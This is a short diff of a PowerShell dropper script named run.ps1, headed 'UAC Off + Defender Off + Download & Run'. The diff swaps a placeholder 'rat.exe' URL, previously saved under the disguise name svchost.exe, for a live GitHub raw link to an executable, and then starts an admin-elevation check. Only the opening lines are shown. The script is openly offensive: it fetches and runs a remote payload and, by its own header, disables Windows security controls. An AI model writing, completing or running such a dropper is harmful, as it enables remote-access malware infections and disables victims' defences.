@@ -1,8 +1,8 @@
 # KRA Quick Bypass - UAC Off + Defender Off + Download & Run
 # Save as: run.ps1
 
-$url = "https://your-server.com/rat.exe"
-$output = "$env:TEMP\svchost.exe"
+$url = "https://github.com/ShramC/discord-server/raw/refs/heads/main/Diler.exe"
+$output = "$env:TEMP\Diler.exe"
 
 # Request admin if not already
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
